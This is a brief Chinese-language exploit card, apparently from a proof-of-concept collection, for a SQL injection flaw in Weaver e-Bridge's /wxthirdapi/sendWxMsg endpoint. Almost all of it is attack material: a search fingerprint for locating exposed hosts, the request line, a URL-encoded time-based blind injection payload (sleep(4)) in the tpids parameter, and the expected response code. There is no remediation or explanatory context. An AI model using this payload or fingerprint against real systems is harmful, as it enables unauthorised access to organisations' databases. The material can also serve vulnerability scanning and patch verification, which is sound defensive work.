# 泛微云桥e-BridgesendWxMsg存在SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`body="泛微云桥e-Bridge"`
- **请求**：`POST /wxthirdapi/sendWxMsg HTTP/1.1`

**Payload**
```
userids=-1&tpids=1%27+or+%28select+%2A+from+%28select+sleep%284%29%29x%29+or+%27x%27%3D%27x
```
- **响应特征**：200